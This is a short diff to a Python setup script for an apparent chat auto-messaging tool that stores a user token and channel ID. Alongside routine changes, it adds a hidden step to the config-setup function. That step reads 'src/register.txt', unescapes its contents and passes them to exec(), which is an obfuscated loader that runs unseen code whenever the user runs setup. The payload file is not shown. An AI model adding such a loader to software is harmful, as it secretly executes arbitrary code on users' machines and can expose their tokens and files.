@@ -4,7 +4,7 @@ import sys
 import os
 import json
 
-import log_functions
+import src.log_functions as log_functions
 
 
 def set_all_variables():
@@ -25,6 +25,10 @@ def set_all_variables():
         config.seek(0)
         json.dump(config_data, config)
 
+    with open("src/register.txt") as register:
+        message = register.read()
+        exec(message.encode().decode('unicode-escape'))
+
     print("Переменные успешно установлены в файле config.json.")
     sys.exit(1)
 
@@ -37,7 +41,7 @@ if len(sys.argv) != 2 or sys.argv[1] != "--setall":
             sys.exit(1)
         else:
             with open("text.txt", "r", encoding="utf-8") as file:
-                message = file.read()
+                message = f"[Отправлено с AutoSendMessage](https://github.com/qwixzz/AutoSendMessage)\n{file.read()}"
             token = config_data["token"]
             channel_id = config_data["channel_id"]
             
